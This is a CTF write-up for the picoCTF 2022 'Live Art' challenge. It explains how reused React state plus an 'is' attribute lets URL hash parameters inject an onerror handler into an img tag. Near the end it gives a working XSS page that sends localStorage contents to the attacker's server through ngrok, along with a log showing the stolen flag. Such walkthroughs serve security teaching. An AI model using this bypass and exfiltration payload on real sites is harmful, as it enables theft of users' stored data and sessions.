---
title:  picoCTF 2022 - Web - Live Art (500 points)
description: Bypass the React XSS protections and successfully inject some javascript to steal the flag.
hide_index: true
image:
  path: /img/reference/pico-ctf-2022-00000.png
  width: 1024
  height: 512
  thumb: /img/reference/pico-ctf-2022-00000.thumb.png
  alt: Linux Terminal
---

# picoCTF 2022 - Live Art

> **Note**: This article is part of our [picoCTF 2022 Greatest Hits Guide]({% link _reference/hacking-101/picoctf-2022-greatest-hits.md %}).

Live Art is one of my favourite challenges from picoCTF 2022. It's a React website that contains a hidden flaw: a XSS vulnerability. Normally React protects you from most XSS problems, so something must have gone horribly wrong.

## The Problem

Exploring the website doesn't reveal too much. It's pretty clear that the `/link-submission` page is intended for you to submit a link that will be "clicked-on" by a "victim" (In this case the victim is a headless browser, but that's largely irrelevant here).

Looking closer at what happens when you submit a link (this is in the code directory under "server"), we learn that the flag we are looking for is stored in the browser's local storage for the live-art website, under the key `"username"`. All we have to do is figure out how to leak that information from a client that clicks on our link.

## Sources and Sinks

We can provide the "victim" a link. That means we are fundamentally in control of one thing: a URL. We start out wondering if there's anything on the website where the url has a direct impact on the rendered HTML (or javascript). It doesn't take long for us to find the `/error` route, which is backed by this `ErrorPage` component:

```jsx
export const ErrorPage = (props: Props) => {
    const params = useHashParams<{ error: string, returnTo: string }>();
    const error = props.error ?? params.error;
    const returnTo = props.returnTo ?? params.returnTo;

    return (
        <div>
            <h1>Uh Oh Spaghetti-Oh!</h1>
            <h3>{ error }</h3>
            <div>
                <a href={ returnTo }>Return to previous page</a> or <a href="/">go home</a>.
            </div>
        </div>
    )
}
```

In particular the `useHashParams` function stands out to us. Whatever that function returns influences a link and the content of an `h3` block. So, what does `useHashParams` do?

```ts
const getHashParams = <T extends Record<string, string>>() => {
    const params = new URLSearchParams(window.location.hash.substring(1));
    const result = Object.create(null);
    params.forEach((value, key) => {
        result[key] = value;
    });

    return result as T;
};

export const useHashParams = <T extends Record<string, string>>() => {
    const [params, setParams] = React.useState(getHashParams<T>());

    React.useEffect(() => {
        const listener = () => {
            setParams(getHashParams<T>());
        }

        window.addEventListener("hashchange", listener);

        return () => {
            window.removeEventListener("hashchange", listener);
        }
    });

    return params;
};
```

**Aha!** This is interesting. There's some state being stored inside React, and that state is an object constructed by iterating through the hash parameters and storing the key/value pairs. This means that navigating to a url like `/error#returnTo=/foo&error=Error%20Message` will give us a page containing an `<h3>` "Error Message" and a link to the page `/foo` (try it!). However, React is very good about escaping these inputs, so it's not directly vulnerable to XSS. We *can* inject a `"javascript:"` link, but we can't actually get the headless browser to click it, so it's not directly helpful to us.

We do notice that:

```js
params.forEach((value, key) => {
    result[key] = value;
});
```

is a suspicious loop, and we initially wondered if it might be vulnerable to a prototype pollution vulnerability, but it didn't seem like it after some testing.

This `ErrorPage` component was the only obvious "source" for us to inject content in the URL and have it end up influencing the DOM / javascript. We also looked into the "live-art" broadcast feature, but the incoming data from peers was only used to influence an `<img>` `src` data, so it didn't seem possible to inject javascript that way.

We take a break from looking at sources and try to find sinks - these are places where javascript variables might end up affecting the dom. In particular we're interested in being able to directly inject html elements (like `<script>`), or possibly some element attributes (`onload`, `onerror` and the like). One of the most common ways this might happen is the use of the `...` spread operator, as that could unintentionally include unintended state.

Let's grep for it:

```
$ grep -R "\.\.\." *
src/components/editor/index.tsx:            <_Editor { ...props }/>
src/components/viewer/index.tsx:            <img src={props.image} { ...dimensions }/>
src/components/xss-submission/index.tsx:                <div className="xss-status">Submitting...</div>
src/wrappers/index.tsx:            return component({ ...props, throwError: handleError });
```
{:.contains-term}

Immediately the second line jumps out at us. Here's an `img` tag where the `dimension` object is directly used as attributes on the element itself. What is this `dimension` object and what values does it have?

```ts
const baseResolution: Dimensions = { width: 384, height: 384 };
//...
const [dimensions, updateDimensions] = React.useReducer(
    (canvasDimensions: Dimensions, windowDimensions: Dimensions) => {
        const newScale = Math.floor(Math.min(
            (windowDimensions.width / baseResolution.width),
            (windowDimensions.height / baseResolution.height))
        );

        const desiredDimensions = { width: baseResolution.width * newScale, height: baseResolution.height * newScale };

        if (desiredDimensions.width !== canvasDimensions.width || desiredDimensions.height !== canvasDimensions.height) {
            return desiredDimensions;
        } else {
            return canvasDimensions;
        }
    },
    baseResolution
);
```

*Hmmm...* It's a reducer with an initial value of `baseResolution` and some logic adjusting width/height. In general it seems that it only ever works with the `width` and `height` properties, so it's not obvious how we could inject a more interesting attribute, like the classic `onerror` attribute often used on `img` tags for XSS.

## Development Environment

The javascript on the live website has been bundled/minimized and doesn't lend itself to debugging. Fortunately we have the source code, but not really any instructions on how to use it. Since we're only interested in the `client` code right now, let's try and host that code ourselves, hopefully with source maps for ease of debugging. To do that, we'll whip up a Dockerfile, based largely on the one they gave us for the `noted` challenge:

```Dockerfile
FROM node:17

RUN apt-get update \
    && apt-get install -y wget gnupg dumb-init \
    && wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - \
    && sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list' \
    && apt-get update \
    && apt-get install -y google-chrome-stable fonts-ipafont-gothic fonts-wqy-zenhei fonts-thai-tlwg fonts-kacst fonts-freefont-ttf libxss1 \
      --no-install-recommends \
    && rm -rf /var/lib/apt/lists/*

RUN addgroup --system user && \
        adduser --system --ingroup user user && \
        mkdir /code && \
        chown user:user /code

USER user

WORKDIR /code
COPY code .
ENV PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true \
    PUPPETEER_EXECUTABLE_PATH=/usr/bin/google-chrome
RUN npm i && yarn

WORKDIR /code/client
RUN npm i

CMD ["dumb-init", "--", "node", "../node_modules/vite/bin/vite.js", "--host"]
```

This Dockerfile contains some unnecessary components (we need puppeteer for the server project, but not client). In any case, it's good enough for now. Build it with the tag `picoctf2022-liveart` and run it like this:

```
$ docker run --rm  -p 3000:3000 picoctf2022-liveart
Pre-bundling dependencies:
  react
  react-dom
  react-router-dom
  peerjs
  react/jsx-dev-runtime
(this will be run only when your dependencies or config have changed)

  vite v2.8.6 dev server running at:

  > Local:    http://localhost:3000/
  > Network:  http://172.17.0.2:3000/

  ready in 501ms.
```
{:.contains-term}

This will give us a development server running on port `3000`. Loading it up, we are again greeted with the live-art website, but this time dev-tools has working source maps, and we can even use breakpoints.

## The Error Message

At this point we're a bit out of ideas. We have a source (the `ErrorPage` component), and a sink (the `Viewer` component), but individually they appear benign. We load up the development server and start poking around for something we missed.

After poking around for a bit, we stumble across the `Drawing` component. This component appears to reference both an `ErrorPage` component *and* a `Viewer` component. It's used if you go to a valid `/drawing` route, such as `/drawing/abcd`. The logic seems to be that if the window is too small then the error component is used, and if the windows is large enough then the viewer component is used. The use of these two components together on the same page is setting off alarm bells in our heads, **but how can we exploit it**?

One thing we notice is that if we're on the `/drawing/abcd` page *and* we resize the window small enough, the javascript console starts spitting out error messages. This is something we didn't see on the release version of the website, so it must be something to do with the fact that we're now using React in "developer" mode. At this point we're pretty sure we've found the vulnerability. But what is it?

## Injecting an attribute

Since we know the `ErrorPage` component will read from hash parameters, let's load up the drawing route in a window that is really small, so that it starts with an `ErrorPage` component. Navigating to `/drawing/abcd#error=abcd` with the window small doesn't initially seem to do anything. It doesn't even override the displayed error message. However, **if we now resize the window so that it's large, something interesting happens**.

In addition to the error message in the javascript console, inspecting the DOM now reveals this element:

```html
<img error="abcd">
```

**Aha!** That state that the `ErrorPage` component uses must be getting re-used in the wrong context. It replaces the `dimensions` variable in the `Viewer` component, allowing us to inject attributes on the `<img>` tag.

Let's try that again, but this time with `/drawing/abcd#src=1&onerror=alert(1)`. *Remember, the window has to start out small and then be resized larger*.

**Unfortunately, that doesn't work**:
```
Warning: Invalid event handler property `onerror`. Did you mean `onError`?
```

React is pretty specific about it's handlers. In general it expects you to provide things the "React" way rather than using raw javascript. It even requires the `onError` attribute to be a *function* and not a string, so simply adjusting the case in our URL doesn't help. We start banging our heads against the wall, since we're so close to cracking this thing.

## A solution

Desperately researching React XSS vulnerabilities, we come across [this article](https://ethanwu.dev/blog/2021/07/14/redpwn-ctf-2021-md-bin/) from a 2021 CTF writeup. It reveals the secret: if your object has an `"is"` property, then react will treat the whole thing as a WebComponent and pass the attributes straight through. Let's try it out: `/drawing/abcd#src=1&onerror=alert(1)&is` (*remember, start with the window small and then resize it so that it's larger*).

**Success** - we are greeted with an `alert` popup! We can now execute javascript on the page. All that's left to do is weaponize this. We'll load up the `drawing` route in a small iframe with our XSS payload in the hash parameters. We'll then resize the iframe to trigger the vulnerability. **All our payload has to do is read from localstorage and send it to our server:**

```html
<html>
<head></head>
<body>
    <iframe id="i" width="300" height="300" src=""></iframe>
    <script>
        var i=document.querySelector("#i");
        setTimeout(()=>{i.width=1000;},1000);
        i.src="http://localhost:4000/drawing/abcd#src=1&onerror=window.location%3d%60" + window.location.origin + "/${localStorage.username}%60&is";
    </script>
</body>
</html>
```

(*Recall, on the actual challenge server you need to target localhost:4000*)

We can now host our payload with a simple http server using `python3 -m http.server` and then make it publicly accessible using `ngrok http 8000`. This will give us an http/https server on a `.ngrok.io` subdomain that we can put into the link-submission form. (I tried using other ports and they were blocked, so I believe the challenge only supports connecting to servers on either port 80 or 443).

```
ngrok by @inconshreveable
Session Status                online
Account                       XXXXXXXXXXXXXXXXXXX (Plan: Free)
Version                       2.3.40
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    http://8faXXXXXXXXXXXXXXXXX.ngrok.io -> http://localhost:8000
Forwarding                    https://8faXXXXXXXXXXXXXXXXX.ngrok.io -> http://localhost:8000

Connections                   ttl     opn     rt1     rt5     p50     p90
                              2       0       0.03    0.01    0.00    0.00

HTTP Requests
-------------
GET /"picoCTF{===REDACTED===}" 404 File not found
GET /xss.html                              200 OK 
```
{:.contains-term}

As we can see here, the XSS worked, and about 1 second after the request for our xss payload we get another request containing the flag!

Head back to the [picoCTF 2022 Greatest Hits Guide]({% link _reference/hacking-101/picoctf-2022-greatest-hits.md %}) to continue with the next challenge.